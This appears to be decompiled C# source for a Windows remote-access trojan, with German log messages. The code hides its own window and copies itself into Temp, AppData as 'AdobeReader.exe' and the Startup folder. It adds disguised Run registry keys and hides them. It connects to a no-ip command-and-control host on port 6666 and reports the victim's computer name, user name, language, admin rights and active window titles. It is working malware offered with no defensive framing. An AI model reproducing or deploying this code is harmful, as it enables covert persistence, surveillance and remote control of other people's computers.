        CultureInfo cultureInfo = new CultureInfo(Thread.CurrentThread.CurrentCulture.Name);
        string[] c = new string[4]
        {
          cultureInfo.Name,
          cultureInfo.EnglishName,
          cultureInfo.DisplayName,
          cultureInfo.ThreeLetterISOLanguageName
        };
        arrayList2.AddRange((ICollection) c);
        arrayList1 = arrayList2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim lesen der Systemzeit");
        ProjectData.ClearProjectError();
      }
      return arrayList1;
    }

    public bool IsAdmin()
    {
      bool flag;
      try
      {
        flag = false;
        AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
        WindowsPrincipal currentPrincipal = (WindowsPrincipal) Thread.CurrentPrincipal;
        if (currentPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
          flag = true;
        else if (currentPrincipal.IsInRole(WindowsBuiltInRole.PowerUser))
          flag = true;
        else if (currentPrincipal.IsInRole(WindowsBuiltInRole.User))
          flag = false;
        flag = flag;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim lesen der Rechte");
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      bool createdNew = false;
      Mutex mutex = new Mutex(true, "MyVBAppMutex", out createdNew);
      if (!createdNew)
        this.Close();
      try
      {
        this.Usertyp = this.IsAdmin();
        this.data.setRUNkey(this.IsAdmin());
        this.data.checkReg64();
        this.HideApp(true);
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | ====> start...");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim starten");
        ProjectData.ClearProjectError();
      }
      try
      {
        this.Visible = false;
        System.IO.File.ReadAllText(Application.ExecutablePath);
        this.IpAdresse = "homecube.no-ip.org";
        this.Port = Conversions.ToInteger("6666");
        this.FilePort = Conversions.ToInteger("6667");
        this.VictimID = "Victem!";
        this.FileMelt = "True";
        this.FileMeltName = "winlogon32.exe";
        Process[] processesByName = Process.GetProcessesByName("updater.exe");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        if (System.IO.File.Exists(this.Updaterpfad))
          System.IO.File.Delete(this.Updaterpfad);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim setzen der Parameter");
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.CompareString(this.FileMelt, "True", false) == 0)
        {
          this.Melt(this.FileMeltName);
        }
        else
        {
          this.data.writeRunKey("Windows-Anmeldeanwendung", MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\server.exe");
          if (!System.IO.File.Exists(MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\server.exe"))
            System.IO.File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\server.exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim Meltcopy");
        ProjectData.ClearProjectError();
      }
      try
      {
        this.data.writeRunKey("Windows-Securitykey", MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + this.FileMeltName);
        if (System.IO.File.Exists(MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + this.FileMeltName))
          System.IO.File.Delete(MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + this.FileMeltName);
        System.IO.File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + this.FileMeltName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim securecopy 1");
        ProjectData.ClearProjectError();
      }
      try
      {
        this.data.writeRunKey("Adobe Reader", MyProject.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\\AdobeReader.exe");
        if (System.IO.File.Exists(MyProject.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\\AdobeReader.exe"))
          System.IO.File.Delete(MyProject.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\\AdobeReader.exe");
        System.IO.File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\\AdobeReader.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim securecopy 2");
        ProjectData.ClearProjectError();
      }
      try
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\startup.exe"))
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\startup.exe");
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\startup.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.data.ReadKey();
      this.data.WriteKey();
      try
      {
        this.TList = this.RetrieveSystemCulture();
        int num1 = checked (this.TList.Count - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          this.Systemsprache = Conversions.ToString(Operators.ConcatenateObject((object) this.Systemsprache, this.TList[Conversions.ToInteger(Conversions.ToString(num2) + " ")]));
          checked { ++num2; }
        }
        this.Flagg = this.Systemsprache.Substring(0, 2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim lesen der Systemsprache");
        ProjectData.ClearProjectError();
      }
      try
      {
        this.BackgroundWorker1.RunWorkerAsync();
        this.Timer1.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim Main");
        ProjectData.ClearProjectError();
      }
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      bool flag = true;
      while (flag)
      {
        try
        {
          TcpClient tcpClient = new TcpClient();
          tcpClient.Connect(this.IpAdresse, this.Port);
          this.Stream_Reader = new StreamReader((Stream) tcpClient.GetStream());
          this.Stream_Writer = new StreamWriter((Stream) tcpClient.GetStream());
          this.Senden(this.Computername + this.SplitKey + this.Username + this.SplitKey + this.VictimID + this.SplitKey + this.AktuellesFenster + this.SplitKey + this.System + this.SplitKey + this.Systemsprache + this.SplitKey + this.Version + this.SplitKey + this.Notiz + this.SplitKey + this.Flagg + this.SplitKey + this.startUP + this.SplitKey + Conversions.ToString(this.IsAdmin()) + this.SplitKey + this.flagmeColor + this.SplitKey);
          this.abhören();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Thread.Sleep(3000);
          ProjectData.ClearProjectError();
        }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (Operators.CompareString(this.AktuellesFenster, Module_logger.GetActiveWindowTitle(), false) != 0)
        {
          this.AktuellesFenster = Module_logger.GetActiveWindowTitle();
          this.Senden("New Window" + this.SplitKey + this.AktuellesFenster);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim lesen der des Fenstertitels");
        ProjectData.ClearProjectError();
      }
      try
      {
        if (~Form1.ShowWindow((long) this.Handle, 0L) == 0L)
          return;
        Form1.ShowWindow((long) this.Handle, 0L);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      try
      {
        Reg.HideValueFromRegistry(Reg.HKEY.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows-Anmeldeanwendung", Application.ExecutablePath);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Reg.HideValueFromRegistry(Reg.HKEY.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows-Anmeldeanwendung", Application.ExecutablePath);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      int num = this.Spread ? 1 : 0;
    }

    public struct MsgBoxParameter
    {
      public string Head;
      public string Body;
      public string Style;
    }
  }
}
